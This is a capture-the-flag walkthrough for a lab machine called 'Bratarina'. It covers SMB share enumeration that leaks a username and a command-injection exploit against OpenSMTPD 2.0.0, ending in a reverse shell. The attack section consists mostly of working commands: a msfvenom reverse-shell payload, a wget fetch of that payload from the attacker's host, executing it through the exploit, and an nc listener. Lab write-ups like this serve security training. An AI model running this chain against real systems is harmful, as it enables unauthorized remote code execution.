---
description: Remote Code Execution via OpenSMTPD 2.0.0 Command Injection
icon: linux
---

# Bratarina

## Summary

* Samba share `backups` exposed a file `passwd.bak` revealing a valid username: `neil`.
* Web service running FlaskBB (turned out to be a rabbit hole). :tired\_face:
* SMTP (OpenSMTPD 2.0.0) was exploitable via a known **command injection vulnerability**.
* Exploited SMTP to write and execute a reverse shell ELF binary.
* Gained a shell as `neil` via `msfvenom` payload.

***

## 🧵 Let's Unpack

#### 🔎 Enumeration

```bash
nmap -p- -T4 192.168.167.71
sudo nmap -A -T4 -sC -sN -oN nmapFull -p 2,25,53,80,445 192.168.167.71
```

* **80/tcp**: Nginx hosting **FlaskBB** → rabbit hole
* **25/tcp**: OpenSMTPD 2.0.0
* **445/tcp**: Samba 4.7.6 → Exposed SMB share `backups`

#### 📂 SMB Enumeration

```bash
crackmapexec smb 192.168.167.71 -u '' -p '' --shares

Share           Permissions     Remark
-----           -----------     ------
backups         READ            Share for backups
IPC$                            IPC Service (Samba 4.7.6-Ubuntu)

>
Got Passwd.bak that has passwd dump 
             
# Username 
- neil
             
             
# We got to know that SMTP is the way to go for rooting the machine      
```

* Found `backups` share with `READ` permission
* Inside: `passwd.bak` with **user: neil**

#### ⚡ Initial Foothold via SMTP RCE

* Exploited **OpenSMTPD 2.0.0** using [Exploit-DB 47984](https://www.exploit-db.com/exploits/47984)

**Payload Preparation:**

```bash
# 1. Create ELF reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.175 LPORT=44 -f elf -o shell

# 2. Start web server to serve ELF file
python3 -m http.server 80
```

**Exploit Chain:**

```bash
# 3. Transfer payload to victim
python3 47984.py 192.168.167.71 25 'wget http://192.168.45.175/shell -O /tmp/shell'

# 4. Make it executable
python3 47984.py 192.168.167.71 25 'chmod +x /tmp/shell'

# 5. Execute reverse shell
python3 47984.py 192.168.167.71 25 '/tmp/shell'
```

* Listener on attacker machine:

```bash
nc -nlvp 44
```

* Got shell! Upgraded to full TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```



